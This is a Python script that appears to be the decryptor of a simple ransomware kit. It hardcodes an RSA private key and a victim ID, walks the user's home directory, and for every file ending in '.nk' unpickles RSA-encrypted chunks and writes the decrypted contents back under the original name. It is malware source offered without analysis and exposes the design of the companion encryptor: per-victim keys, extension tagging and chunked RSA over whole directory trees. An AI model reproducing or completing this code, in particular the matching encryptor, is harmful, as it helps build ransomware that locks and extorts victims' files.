global privateKey
m_id = '1234567891'
privateKey = 'PrivateKey(90756831079320730759368774926132164334587830180167635853586431835325078097547696696744307407175994902618103261810251710578726465583590085917828849764602758859054084936063159673985364171187925735931814544812918386031820989940410209687358261743308116272646273485119011417296286649992939828441157500161483359521, 65537, 71784821591753493757318754075498008798267075896811720703455450616411280243871095009981150541919557620382602480773578557475463383988534099573103623622972479874326574253901126739909327584722166683739929460590861826513307329508833711777638408197224826265915012148661283643626072563498835475411624740105925727173, 36727992858333874371122186730388007837160464199789913205254082406782723340384876739417161540073104641948368210293994956614198499053227122858728833128187338762268291, 2471053385067495793848697824795252481678045685870256748783121420373543795919641202513777282167518273311311967711699120188541164221789387297467531)'

import os
import rsa
import pickle

t = privateKey.split(', ')
n = int((t[0])[11:])
e = int(t[1])
d = int(t[2])
p = int(t[3])
q = int((t[4])[:-1])

def decrypt():
    global privateKey

    pk = rsa.key.PrivateKey(n, e, d, p, q)

    partpath = os.path.expanduser('~') + "/"
    try:
        for dirpath, dirs, files in os.walk(partpath, topdown = True):
            dirpath = dirpath + "/"
            for filename in files:
                fname = dirpath + filename
                chk = ".nk"
                if fname[-3:] == chk:
                    nfname = fname[:-3]
                    with open(fname, 'rb') as f:
                        data = pickle.load(f)
                    os.rename(fname, nfname)
                    with open(nfname, 'wb') as f:
                        pass
                    for i in range(len(data)):
                        pt = rsa.decrypt(data[i], pk)
                        with open(nfname, 'ab') as f:
                            f.write(pt)
    except:
        pass

decrypt()